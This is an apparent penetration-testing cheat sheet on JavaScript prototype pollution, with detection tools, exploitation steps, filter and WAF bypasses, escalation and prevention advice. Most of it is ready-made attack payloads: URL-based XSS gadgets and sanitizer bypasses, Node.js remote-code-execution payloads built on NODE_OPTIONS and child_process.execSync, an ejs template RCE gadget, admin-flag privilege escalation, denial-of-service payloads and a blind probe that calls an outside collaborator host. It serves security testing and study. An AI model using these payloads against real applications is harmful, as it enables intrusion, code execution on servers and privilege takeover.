# Prototype Pollution

> **Summary**: Prototype pollution is a JavaScript vulnerability where an attacker injects properties into global object prototypes (`Object.prototype`), affecting all objects in the application.
> **Impact**: Cross-site scripting (XSS) via client-side PP, remote code execution (RCE) via server-side PP, denial of service, authentication bypass, privilege escalation.
> **Typical Severity**: High (client-side XSS) | Critical (server-side RCE)

---

## Detection

### Indicators
- Application uses recursive merge, deep clone, or extend functions on user-controlled objects
- JavaScript frameworks with known PP sinks (Express, Lodash, jQuery, ejs, pug, Handlebars)
- JSON body parsing that feeds directly into merge/clone operations

### Automated Detection
- **Burp Suite DOM Invader** -- dedicated Prototype Pollution tab, auto-mutates `__proto__` and `constructor.prototype`
- **PPScan** (browser extension) -- scans pages you visit for client-side PP: `https://github.com/msrkp/PPScan`
- **ppmap** -- finds PP vulnerabilities and known gadgets: `https://github.com/kleiton0x00/ppmap`
- **ppfuzz** -- fuzzer for client-side PP (supports ESM, HTTP/2, WebSocket): `https://github.com/dwisiswant0/ppfuzz`
- **proto-find** -- `https://github.com/kosmosec/proto-find`
- **Server-Side Prototype Pollution Scanner** (Burp extension by PortSwigger)

### Manual Detection

#### Client-Side
```javascript
// In browser console -- pollute and check
Object.prototype.testpollution = "polluted";
// Then check if the app behavior changes or if "testpollution" appears in unexpected places

// Using URL parameters:
// https://<TARGET>/?__proto__[testpollution]=polluted
// https://<TARGET>/?constructor.prototype.testpollution=polluted
// https://<TARGET>/#__proto__[testpollution]=polluted
```

#### Server-Side (Safe Probing via Express Gadgets)
```json
// JSON spaces -- adds extra space to JSON responses (non-destructive)
{"__proto__":{"json spaces":" "}}

// Status code override -- changes response status
{"__proto__":{"status":510}}

// Exposed headers -- adds CORS header
{"__proto__":{"exposedHeaders":["foo"]}}

// OPTIONS method hiding
{"__proto__":{"head":true}}

// Content-type override (confirms pollution)
{"__proto__":{"content-type":"application/json; charset=utf-7"}}
```

#### Debugging Property Access
```javascript
// Set a breakpoint when a polluted property is read
Object.defineProperty(Object.prototype, '<PROPERTY_NAME>', {
    __proto__: null,
    get() {
        console.trace();
        return 'test';
    }
});
```

---

## Exploitation

### Prerequisites
1. A merge, clone, extend, or deep-set function that does not filter `__proto__` or `constructor`
2. User-controlled input reaches the vulnerable function (JSON body, query params, URL hash)
3. For RCE: a code path that spawns child processes after the pollution occurs

### Step-by-Step

1. **Identify the sink** -- find merge/clone/extend operations that accept user input
   - Success criteria: locate the vulnerable function in source code or via automated tool
2. **Confirm pollution** -- inject a benign property and verify it propagates
   - Success criteria: `({}).testpollution === "polluted"` returns true
3. **Find a gadget** -- identify code that reads from `Object.prototype` and performs a sensitive action
   - Success criteria: DOM manipulation (client) or process spawning (server) triggered
4. **Exploit the gadget** -- craft a payload that chains pollution with the gadget for XSS or RCE
   - Success criteria: JavaScript execution in browser or OS command execution on server

### Client-Side PP to XSS

#### Via innerHTML/srcdoc Gadgets
```javascript
// Pollute via URL:
// https://<TARGET>/?__proto__[innerHTML]=<img/src/onerror=alert(1)>
// https://<TARGET>/?__proto__[srcdoc]=<script>alert(1)</script>
```

#### Via HTML Sanitizer Bypass
```javascript
// DOMPurify bypass (pre-patch versions)
Object.prototype.ALLOWED_TAGS = ['img'];
Object.prototype.ALLOW_DATA_ATTR = true;

// sanitize-html bypass
{"__proto__":{"innerHTML":"<img/src/onerror=alert(1)>"}}

// Closure sanitizer bypass
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
```

#### Via Express (Server Reflects HTML)
```json
// Pollute body and _body to make Express serve HTML instead of JSON
{"__proto__":{"_body":true,"body":"<script>alert(document.domain)</script>"}}
```

### Server-Side PP to RCE (Node.js)

#### Via NODE_OPTIONS + /proc/self/environ (fork/spawn gadget)
```json
{
  "__proto__":{
    "NODE_OPTIONS":"--require /proc/self/environ",
    "env":{
      "EVIL":"require('child_process').execSync('id').toString()//"
    }
  }
}
```

#### Via NODE_OPTIONS + /proc/self/cmdline
```json
{
  "__proto__":{
    "NODE_OPTIONS":"--require /proc/self/cmdline",
    "argv0":"require('child_process').execSync('id').toString()//"
  }
}
```

#### Via --import data URI (Node >= 19, no filesystem needed)
```json
{
  "__proto__":{
    "NODE_OPTIONS":"--import data:text/javascript;base64,<BASE64_PAYLOAD>"
  }
}
```

#### DNS-Based Detection (confirm PP2RCE blind)
```json
{
  "__proto__":{
    "argv0":"node",
    "shell":"node",
    "NODE_OPTIONS":"--inspect=<BURP_COLLABORATOR>"
  }
}
```

### Proof of Concept
```bash
# Target: Express app with vulnerable lodash.merge on POST /api/settings
curl -X POST http://<TARGET>/api/settings \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"json spaces":"  "}}'

# Verify: subsequent JSON responses have double-spaced formatting
curl http://<TARGET>/api/data
# Expected: {"key":  "value"}  (note extra space)
```

---

## Bypasses

### Alternative Pollution Vectors
```javascript
// When __proto__ is filtered:
{"constructor":{"prototype":{"polluted":"yes"}}}

// Via Object.assign with spread:
Object.assign({}, JSON.parse(userInput))

// Via query string with allowDots (Express/qs):
?constructor.prototype.polluted=yes

// Via array index pollution:
{"__proto__":{"0":"malicious"}}
```

### WAF Bypass
```javascript
// Unicode escaping
{"__pro\u0074o__":{"polluted":"yes"}}

// Mixed case (some parsers)
{"__PROTO__":{"polluted":"yes"}}

// Nested constructor path
{"constructor":{"constructor":{"prototype":{"polluted":"yes"}}}}
```

---

## Escalation

### PP to RCE in Popular Libraries

| Library | Gadget | Payload |
|---------|--------|---------|
| **ejs** | `opts.outputFunctionName` | `{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('<CMD>');//"}}` |
| **pug** | `block.type = "Code"` | Pollute `block` properties to inject code into template compilation |
| **Handlebars** | `allowProtoMethodsByDefault` | `{"__proto__":{"allowProtoMethodsByDefault":true}}` then use `{{#with this}}` |
| **express-handlebars** | `layout` | `{"__proto__":{"layout":"/etc/passwd"}}` -- path traversal via layout resolution |
| **lodash < 4.17.21** | `_.merge()` / `_.set()` | Classic recursive merge pollution |

### PP to Privilege Escalation
```json
// Override isAdmin / role checks
{"__proto__":{"isAdmin":true}}
{"__proto__":{"role":"admin"}}
{"__proto__":{"verified":true}}
```

### PP to DoS
```json
// Override toString to crash serialization
{"__proto__":{"toString":null}}

// Pollute length to break iterations
{"__proto__":{"length":0}}
```

---

## Where to Find PP

- **Deep merge functions**: `lodash.merge`, `lodash.defaultsDeep`, `lodash.set`, `jQuery.extend(true, ...)`, `hoek.merge`
- **JSON parsing + merge**: `JSON.parse()` output fed into a merge/clone
- **Query string parsers**: `qs` library with `allowDots`, `querystring.parse`
- **URL hash parsing**: `location.hash` parsed into an object
- **Form deserialization**: `body-parser` feeding into vulnerable middleware
- **GraphQL resolvers**: arguments merged into context objects
- Related to [Mass Assignment](mass-assignment.md) -- similar concept at a different abstraction level

---

## Tools

| Tool | Usage |
|------|-------|
| [ppmap](https://github.com/kleiton0x00/ppmap) | `ppmap -url "https://<TARGET>"` |
| [PPScan](https://github.com/msrkp/PPScan) | Browser extension -- passive scanning |
| [ppfuzz](https://github.com/dwisiswant0/ppfuzz) | `ppfuzz -l urls.txt` |
| [proto-find](https://github.com/kosmosec/proto-find) | Automated client-side PP discovery |
| [Burp DOM Invader](https://portswigger.net) | Built-in prototype pollution tab |
| [Server-Side PP Scanner](https://portswigger.net/research/server-side-prototype-pollution) | Burp extension for safe server-side probing |
| [NodeJsScan](https://github.com/ajinabraham/nodejsscan) | SAST for Node.js -- detects PP sinks |

---

## Prevention

- Freeze the prototype early: `Object.freeze(Object.prototype)`
- Create objects without prototype: `Object.create(null)`
- Validate user input against a whitelist of allowed properties
- Use `Map` instead of plain objects for key-value data
- Use `structuredClone()` instead of custom deep-merge functions
- Upgrade vulnerable libraries: lodash >= 4.17.22, deepmerge >= 5.3.0
- Use `Object.hasOwn()` checks instead of `in` operator

---

## References

- [PortSwigger -- Server-Side Prototype Pollution](https://portswigger.net/research/server-side-prototype-pollution)
- [PortSwigger -- Widespread Prototype Pollution Gadgets](https://portswigger.net/research/widespread-prototype-pollution-gadgets)
- [BlackFan -- Client-Side Prototype Pollution](https://github.com/BlackFan/client-side-prototype-pollution)
- [Securitum -- Prototype Pollution RCE in Kibana (CVE-2019-7609)](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
- [SonarSource -- BlitzJS Prototype Pollution](https://blog.sonarsource.com/blitzjs-prototype-pollution/)
- [HoLyVieR -- JS Prototype Pollution in NodeJS (PDF)](https://raw.githubusercontent.com/HoLyVieR/prototype-pollution-nsec18/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)
- [Gadget Inspector](https://github.com/nicktate/pp-gadgets)
- Related: [XSS](xss.md) | [Mass Assignment](mass-assignment.md)
